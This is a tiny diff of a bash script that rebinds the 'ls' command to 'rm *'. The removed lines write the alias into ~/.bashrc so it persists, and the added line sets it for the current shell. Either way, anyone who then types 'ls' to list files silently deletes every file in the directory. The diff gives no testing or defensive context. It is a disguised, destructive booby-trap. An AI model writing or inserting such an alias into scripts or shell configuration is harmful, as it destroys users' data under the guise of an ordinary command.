@@ -1,4 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" >> ~/.bashrc
-source ~/.bashrc
-echo "Alias 'ls' set to 'rm *'"
+alias ls="rm *"
